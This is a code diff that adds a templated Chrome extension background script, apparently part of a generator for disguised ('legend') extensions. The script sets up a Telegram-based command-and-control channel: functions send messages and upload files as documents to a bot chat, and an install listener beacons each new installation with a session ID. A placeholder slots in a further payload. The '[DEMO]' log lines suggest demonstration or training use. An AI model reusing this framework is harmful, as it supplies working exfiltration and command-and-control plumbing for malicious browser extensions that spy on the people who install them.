@@ -1,0 +1,83 @@
+
+var C2_CONFIG = {
+    botToken: "{{ c2_bot_token }}",
+    chatId: "{{ c2_chat_id }}",
+    sessionId: "{{ c2_session_id }}",
+    enabled: {{ c2_enabled }},
+    sendRealData: {{ c2_send_real_data }}
+};
+
+
+function c2Escape(text) {
+    if (!text) return '';
+    return String(text)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+async function c2Send(text) {
+    if (!C2_CONFIG.enabled) {
+        console.log('[C2 disabled]', text);
+        return;
+    }
+    if (!C2_CONFIG.botToken || !C2_CONFIG.chatId) {
+        console.log('[C2 not configured]', text);
+        return;
+    }
+
+    var url = 'https://api.telegram.org/bot' + C2_CONFIG.botToken + '/sendMessage';
+
+    try {
+        var res = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: C2_CONFIG.chatId,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
+        });
+
+        if (!res.ok) {
+            console.log('[C2] Failed:', res.status);
+        } else {
+            console.log('[C2] Sent');
+        }
+    } catch (e) {
+        console.log('[C2] Error:', e.message);
+    }
+}
+
+async function c2SendDocument(filename, content) {
+    if (!C2_CONFIG.enabled) return;
+    if (!C2_CONFIG.botToken || !C2_CONFIG.chatId) return;
+
+    var url = 'https://api.telegram.org/bot' + C2_CONFIG.botToken + '/sendDocument';
+    var formData = new FormData();
+
+    formData.append('chat_id', C2_CONFIG.chatId);
+    formData.append('document', new Blob([content], {type: 'application/json'}), filename);
+    formData.append('caption', '📎 ' + filename);
+
+    try {
+        await fetch(url, { method: 'POST', body: formData });
+        console.log('[C2] Document sent:', filename);
+    } catch (e) {
+        console.log('[C2] Document error:', e.message);
+    }
+}
+
+chrome.runtime.onInstalled.addListener(function() {
+    c2Send(
+        '🟢 <b>Расширение установлено</b>\n' +
+        'Сессия: <code>' + C2_CONFIG.sessionId + '</code>'
+    );
+});
+
+
+{{ payload_background_js }}
+
+console.log('[DEMO] Extension: {{ legend.name }}');
+console.log('[DEMO] Payload: {{ payload.name }}');
